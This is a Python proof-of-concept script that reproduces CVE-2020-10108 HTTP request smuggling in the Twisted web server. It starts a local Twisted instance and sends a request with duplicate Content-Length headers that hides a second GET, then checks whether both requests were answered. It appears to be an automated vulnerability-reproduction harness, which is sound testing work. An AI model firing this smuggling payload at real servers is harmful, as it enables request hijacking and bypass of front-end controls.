import socket
import subprocess
import time
import os
import shutil
import sys

# --- Configuration ---
HOST = '127.0.0.1'
PORT = 8080
TEST_FILE_CONTENT = "Hello"


def poc():
    """
    CVE-2020-10108 (HTTP Request Splitting) PoC - Robust Version

    Note: The vulnerability exploited here (Double Content-Length header) is
    formally tracked as CVE-2020-10108. This PoC is based on the description
    provided in the prompt.

    This script ensures stable execution and automatic exit, making it
    suitable for automated environments like Docker.
    """
    server_process = None
    exit_code = 1  # Default to failure exit code

    # Check if 'twistd' exists in the system's PATH
    if not shutil.which("twistd"):
        print("[-] Error: 'twistd' command not found. Please install the Twisted framework first.")
        sys.exit(exit_code)

    # 1. Create a test web page file for the smuggled request to retrieve
    with open("index.html", "w") as f:
        f.write(TEST_FILE_CONTENT)

    try:
        # 2. Start the Twisted server using subprocess
        print(f"[+] Starting Twisted server on port {PORT}...")
        command = ["twistd", "-n", "web", "--path", ".", f"--port=tcp:{PORT}"]
        server_process = subprocess.Popen(
            command,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(2)  # Wait for the server to initialize
        print("[+] Server started.")

        # 3. Construct and send the malicious request (with a 5-second timeout)
        # The smuggled request is a simple 'GET /' which will serve our index.html
        smuggled_request = b'GET / HTTP/1.1\r\nHost: smuggled.com\r\n\r\n'

        # The main request contains two Content-Length headers.
        # The first CL has the correct length of the smuggled request.
        # The second CL is 0, which the vulnerable Twisted version will prioritize.
        payload = (
                b'GET /nonexistent HTTP/1.1\r\n'
                b'Host: example.com\r\n'
                b'Content-Length: ' + str(len(smuggled_request)).encode() + b'\r\n'
                                                                            b'Content-Length: 0\r\n'
                                                                            b'\r\n' +
                smuggled_request
        )

        print("[+] Sending malicious payload...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)  # Set a 5-second network timeout
            s.connect((HOST, PORT))
            s.sendall(payload)
            response = s.recv(4096).decode(errors='ignore')

        # 4. Print the result
        print("\n--- Server Response ---\n")
        print(response)
        print("--- End of Response ---\n")

        # 5. Verify the result
        if "HTTP/1.1 404 Not Found" in response and f"HTTP/1.1 200 OK" in response and TEST_FILE_CONTENT in response:
            print("[SUCCESS] Exploit successful! The server processed two requests.")
            exit_code = 0  # Success, set exit code to 0
        else:
            print("[FAIL] Exploit failed. The server might not be vulnerable or the payload is incorrect.")

    except socket.timeout:
        print("[-] Error: Network operation timed out. The server did not respond within 5 seconds.")
    except Exception as e:
        print(f"[-] An error occurred: {e}")
    finally:
        # 6. Cleanup (force process termination)
        if server_process:
            print("[+] Stopping server...")
            server_process.terminate()  # Try to terminate gracefully
            try:
                # Wait for 5 seconds for a graceful shutdown
                server_process.wait(timeout=5)
                print("[+] Server stopped gracefully.")
            except subprocess.TimeoutExpired:
                # If it times out, kill the process forcefully
                print("[!] Server did not stop gracefully, killing it forcefully...")
                server_process.kill()
                server_process.wait()  # Wait for the killed process to be reaped
                print("[+] Server has been forcefully killed.")

        if os.path.exists("index.html"):
            os.remove("index.html")
        print("[+] Cleanup complete.")

        # 7. Exit the script explicitly
        print(f"[+] PoC execution finished, exiting with status code {exit_code}.")
        sys.exit(exit_code)


if __name__ == '__main__':
    poc()
